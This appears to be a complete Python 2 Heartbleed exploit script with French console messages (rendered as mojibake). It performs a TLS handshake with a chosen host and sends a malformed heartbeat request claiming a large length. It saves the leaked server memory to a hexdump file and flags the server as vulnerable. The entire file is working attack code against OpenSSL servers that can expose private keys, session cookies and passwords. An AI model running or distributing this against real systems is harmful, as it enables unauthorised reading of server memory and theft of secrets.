#!/usr/bin/python
# -*- coding: utf-8 -*-

import argparse
import struct
import socket
import sys

def h2bin(x):
    return x.replace(' ', '').replace('\n', '').decode('hex')

hello = h2bin('''
16 03 02 00  dc 01 00 00 d8 03 02 53
43 5b 90 9d 9b 72 0b bc  0c bc 2b 92 a8 48 97 cf
bd 39 04 cc 16 0a 85 03  90 9f 77 04 33 d4 de 00
00 66 c0 14 c0 0a c0 22  c0 21 00 39 00 38 00 88
00 87 c0 0f c0 05 00 35  00 84 c0 12 c0 08 c0 1c
c0 1b 00 16 00 13 c0 0d  c0 03 00 0a c0 13 c0 09
c0 1f c0 1e 00 33 00 32  00 9a 00 99 00 45 00 44
c0 0e c0 04 00 2f 00 96  00 41 c0 11 c0 07 c0 0c
c0 02 00 05 00 04 00 15  00 12 00 09 00 14 00 11
00 08 00 06 00 03 00 ff  01 00 00 49 00 0b 00 04
03 00 01 02 00 0a 00 34  00 32 00 0e 00 0d 00 19
00 0b 00 0c 00 18 00 09  00 0a 00 16 00 17 00 08
00 06 00 07 00 14 00 15  00 04 00 05 00 12 00 13
00 01 00 02 00 03 00 0f  00 10 00 11 00 23 00 00
00 0f 00 01 01                                  
''')

hb = h2bin('''
18 03 02 00 03
01 40 00
''')

def recvall(sock, count):
    buf = b''
    while count:
        newbuf = sock.recv(count)
        if not newbuf:
            return None
        buf += newbuf
        count -= len(newbuf)
    return buf

def hexdump(payload, ascii_only, outfile):
    with open(outfile, 'w') as f:
        for b in range(0, len(payload), 16):
            lin = payload[b: b + 16]
            if ascii_only:
                text = ''.join(c if 32 <= ord(c) <= 126 else '' for c in lin)
                f.write(text)
            else:
                hex_bytes = ' '.join('%02X' % ord(c) for c in lin)
                ascii_text = ''.join(c if 32 <= ord(c) <= 126 else '.' for c in lin)
                f.write('%04x: %-48s %s\n' % (b, hex_bytes, ascii_text))
        f.write('\n')

def hit_heartbleed(s, output_file, ascii_only):
    s.send(hb)
    while True:
        hdr = s.recv(5)
        if not hdr:
            print '[!] EOF - serveur a ferm√© la connexion'
            return False
        typ, ver, ln = struct.unpack('>BHH', hdr)
        payload = recvall(s, ln)
        if not payload:
            print '[!] EOF dans le payload'
            return False

        print '‚û°Ô∏è  Re√ßu : type = %d, version = %04x, longueur = %d' % (typ, ver, len(payload))
        if typ == 24:
            print '‚úÖ Donn√©es enregistr√©es dans : %s' % output_file
            hexdump(payload, ascii_only, output_file)
            if len(payload) > 3:
                print 'üö® Le serveur est vuln√©rable ! (donn√©es en trop)'
            return True
        elif typ == 21:
            print '[!] Alerte SSL (type 21) re√ßue.'
            return False

def main():
    parser = argparse.ArgumentParser(description='Heartbleed Exploit')
    parser.add_argument('host', help='Adresse IP ou FQDN de la cible')
    parser.add_argument('--port', type=int, default=443, help='Port SSL (d√©faut: 443)')
    parser.add_argument('--output', default='out.txt', help='Fichier de sortie')
    parser.add_argument('--ascii', action='store_true', help='√âcrit uniquement la sortie ASCII (sans hex)')
    args = parser.parse_args()

    print 'üîå Connexion √† %s:%d...' % (args.host, args.port)
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((args.host, args.port))

    print 'üì§ Envoi de Client Hello...'
    s.send(hello)

    while True:
        hdr = s.recv(5)
        if not hdr:
            print '[!] Aucune r√©ponse pendant le handshake.'
            return
        typ, ver, ln = struct.unpack('>BHH', hdr)
        data = recvall(s, ln)
        print '   ‚Ü™ type=%d version=%04x longueur=%d' % (typ, ver, ln)
        if typ == 22 and ord(data[0]) == 0x0E:
            break

    print 'ü§ù Handshake termin√©.'
    print 'üì® Envoi heartbeat...'
    hit_heartbleed(s, args.output, args.ascii)
    s.close()

if __name__ == '__main__':
    main()
